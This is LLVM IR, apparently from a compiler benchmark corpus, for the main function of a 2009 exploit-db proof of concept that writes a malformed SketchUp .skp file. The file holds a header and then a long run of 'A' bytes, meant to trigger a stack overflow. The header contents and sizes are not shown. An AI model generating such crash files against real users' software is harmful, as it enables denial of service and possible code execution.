; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_9317.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_9317.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [81 x i8] c"################################################################################\00", align 1
@.str.2 = private unnamed_addr constant [77 x i8] c"\0AGoogle SketchUp Pro 7.0 (.skp file) Remote Stack Overflow Proof Of Concept\0A\00", align 1
@.str.3 = private unnamed_addr constant [81 x i8] c"--------------------------------------------------------------------------------\00", align 1
@.str.4 = private unnamed_addr constant [48 x i8] c"\09\09by LiquidWorm <liquidworm gmail com> - 2009\0A\0A\00", align 1
@SIZE_S = common dso_local global i32 0, align 4
@BUFF_S = common dso_local global i32 0, align 4
@header = common dso_local global i8* null, align 8
@FILE_N = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@filetzio = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [24 x i8] c"Oops! Can't open file.\0A\00", align 1
@.str.7 = private unnamed_addr constant [44 x i8] c"\0A----> Creating PoC SketchUp Model File...\0A\00", align 1
@.str.8 = private unnamed_addr constant [41 x i8] c"\0A----> File: %s successfully generated!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.1, i64 0, i64 0))
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.2, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.3, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.4, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* @SIZE_S, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %6, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %7, align 8
  %19 = load i32, i32* @BUFF_S, align 4
  %20 = zext i32 %19 to i64
  %21 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %8, align 8
  %22 = load i32, i32* @BUFF_S, align 4
  %23 = call i32 @memset(i8* %21, i32 65, i32 %22)
  %24 = load i8*, i8** @header, align 8
  %25 = load i8*, i8** @header, align 8
  %26 = call i32 @strlen(i8* %25)
  %27 = call i32 @memcpy(i8* %18, i8* %24, i32 %26)
  %28 = load i8*, i8** @header, align 8
  %29 = call i32 @strlen(i8* %28)
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %18, i64 %30
  %32 = load i32, i32* @BUFF_S, align 4
  %33 = call i32 @memcpy(i8* %31, i8* %21, i32 %32)
  %34 = load i8*, i8** @FILE_N, align 8
  %35 = call i32* @fopen(i8* %34, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  store i32* %35, i32** @filetzio, align 8
  %36 = load i32*, i32** @filetzio, align 8
  %37 = icmp eq i32* %36, null
  br i1 %37, label %38, label %40

38:                                               ; preds = %2
  %39 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.6, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %2
  %41 = trunc i64 %16 to i32
  %42 = load i32*, i32** @filetzio, align 8
  %43 = call i32 @fwrite(i8* %18, i32 1, i32 %41, i32* %42)
  %44 = load i32*, i32** @filetzio, align 8
  %45 = call i32 @fclose(i32* %44)
  %46 = call i32 @sleep(i32 2)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.7, i64 0, i64 0))
  %48 = call i32 @sleep(i32 1)
  %49 = load i8*, i8** @FILE_N, align 8
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.8, i64 0, i64 0), i8* %49)
  store i32 0, i32* %3, align 4
  %51 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %51)
  %52 = load i32, i32* %3, align 4
  ret i32 %52
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @sleep(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
